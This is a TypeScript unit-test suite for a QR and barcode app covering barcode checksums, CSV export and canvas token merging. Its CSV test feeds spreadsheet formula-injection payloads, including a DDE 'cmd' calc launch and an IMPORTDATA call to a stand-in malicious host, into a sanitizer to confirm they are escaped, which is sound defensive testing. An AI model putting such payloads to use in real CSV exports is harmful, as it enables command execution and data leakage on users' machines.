/**
 * @fileoverview Phase 3 Unit Test Suite: Enterprise Vector Barcodes,
 * CSV Formula Injection Sanitization, Manifest Index Generator, and VDP Canvas Merger.
 */

import { describe, it, expect } from 'vitest';
import {
  encodeCode128B,
  encodeCode39,
  encodeEan13,
  calculateEan13CheckDigit,
  renderBarcodeVector,
} from '@/lib/barcode-engine';
import {
  sanitizeCsvField,
  generateManifestCsv,
} from '@/lib/batch-zip-exporter';
import {
  mergeVDPCanvasBatch,
  type VDPRecordData,
} from '@/lib/vdp-canvas-merger';
import type { QRCode as QRCodeType } from '@/lib/types';
import type { CanvasState, CanvasElement } from '@/app/admin/qr-studio/components/designer/canvas-types';
import { DEFAULT_QR_DESIGN } from '@/lib/qr-constants';

describe('Enterprise Barcode Engine — Code 128, Code 39, EAN-13 Checksums', () => {
  it('calculates correct Modulo-103 checksum for Code 128', () => {
    const result = encodeCode128B('ITEM-12345');
    expect(result.checksumValid).toBe(true);
    expect(result.modules.length).toBeGreaterThan(50);
    expect(result.computedText).toBe('ITEM-12345');
  });

  it('generates start/stop asterisks for Code 39', () => {
    const result = encodeCode39('ASSET-99');
    expect(result.checksumValid).toBe(true);
    expect(result.computedText).toBe('ASSET-99');
    expect(result.modules.length).toBeGreaterThan(60);
  });

  it('computes exact Modulo-10 check digit for EAN-13', () => {
    // 4006381333931: first 12 digits '400638133393', check digit is 1
    const checkDigit = calculateEan13CheckDigit('400638133393');
    expect(checkDigit).toBe(1);

    const result = encodeEan13('400638133393');
    expect(result.computedText).toBe('4006381333931');
    expect(result.checksumValid).toBe(true);
  });

  it('renders clean sanitized SVG with rects and human readable text', () => {
    const render = renderBarcodeVector('INV-2025-001', {
      symbology: 'code128',
      barColor: '#000000',
      showText: true,
    });

    expect(render.svg).toContain('<svg');
    expect(render.svg).toContain('<rect');
    expect(render.svg).toContain('INV-2025-001');
    expect(render.width).toBeGreaterThan(100);
    expect(render.height).toBeGreaterThan(50);
  });
});

describe('Batch Exporter — CSV Formula Injection (DDE) Sanitization', () => {
  it('escapes dangerous spreadsheet formula triggers (=, +, -, @)', () => {
    expect(sanitizeCsvField('=cmd|"/C calc"!A0')).toBe('"\'=cmd|""/C calc""!A0"');
    expect(sanitizeCsvField('+SUM(A1:A10)')).toBe('"\'\+SUM(A1:A10)"');
    expect(sanitizeCsvField('-DANGEROUS')).toBe('"\'\-DANGEROUS"');
    expect(sanitizeCsvField('@IMPORTDATA("http://malicious.com")')).toBe('"\'\@IMPORTDATA(""http://malicious.com"")"');
  });

  it('safely handles standard alphanumeric strings and empty values', () => {
    expect(sanitizeCsvField('Campus Open Day')).toBe('"Campus Open Day"');
    expect(sanitizeCsvField('')).toBe('""');
    expect(sanitizeCsvField(null)).toBe('""');
    expect(sanitizeCsvField(undefined)).toBe('""');
  });

  it('builds a complete manifest.csv with header and mapped data rows', () => {
    const sampleQRs: QRCodeType[] = [
      {
        id: 'qr_test_1',
        organizationId: 'org_1',
        workspaceId: 'ws_1',
        name: 'Flyer A',
        slug: 'flyer-a',
        mode: 'dynamic',
        type: 'url',
        destination: { url: 'https://example.com/a' },
        shortPath: 'fly123',
        redirectUrl: '/q/fly123',
        design: DEFAULT_QR_DESIGN,
        status: 'active',
        tracking: { enabled: true, utmSource: 'csv_batch', utmCampaign: 'promo' },
        stats: { totalScans: 42, uniqueScans: 30, uniqueVisitors: 28, scanCountToday: 5 },
        createdBy: { userId: 'u1', name: 'Admin', email: 'admin@test.com' },
        createdAt: '2025-01-01T00:00:00.000Z',
        updatedAt: '2025-01-01T00:00:00.000Z',
      },
    ];

    const csv = generateManifestCsv(sampleQRs);
    expect(csv).toContain('"Filename","QR Code ID","Name"');
    expect(csv).toContain('"qr-1-flyer-a.png"');
    expect(csv).toContain('"Flyer A"');
    expect(csv).toContain('https://smartsapp.com/q/fly123');
    expect(csv).toContain('"42"');
  });
});

describe('Variable Data Printing (VDP) — Dynamic Canvas Token Merger', () => {
  it('merges custom contact tokens into poster canvas text layers', () => {
    const masterCanvas: CanvasState = {
      width: 600,
      height: 900,
      backgroundColor: '#FFFFFF',
      selectedId: null,
      elements: [
        {
          id: 'el_heading',
          type: 'text',
          text: 'Welcome {{name}} (ID: {{student_id}})!',
          x: 10,
          y: 10,
          width: 80,
          height: 10,
          fontSize: 24,
          fill: '#000000',
        },
        {
          id: 'el_sub',
          type: 'text',
          text: 'Class: {{class}} | Seat: {{seat_number}}',
          x: 10,
          y: 25,
          width: 80,
          height: 8,
          fontSize: 18,
          fill: '#475569',
        },
        {
          id: 'el_qr',
          type: 'qr',
          isQR: true,
          x: 30,
          y: 40,
          width: 40,
          height: 40,
        },
      ],
    };

    const records: VDPRecordData[] = [
      {
        id: 'rec_101',
        name: 'Sarah Connor',
        qrDestinationUrl: 'https://smartsapp.com/q/sc101',
        attributes: {
          student_id: 'STU-9942',
          class: 'Grade 12A',
          seat_number: 'B-14',
        },
      },
    ];

    const merged = mergeVDPCanvasBatch(masterCanvas, records);
    expect(merged.length).toBe(1);
    expect(merged[0].recordName).toBe('Sarah Connor');

    const headingEl = merged[0].canvas.elements.find((el: CanvasElement) => el.id === 'el_heading');
    const subEl = merged[0].canvas.elements.find((el: CanvasElement) => el.id === 'el_sub');

    expect(headingEl?.text).toBe('Welcome Sarah Connor (ID: STU-9942)!');
    expect(subEl?.text).toBe('Class: Grade 12A | Seat: B-14');
  });
});
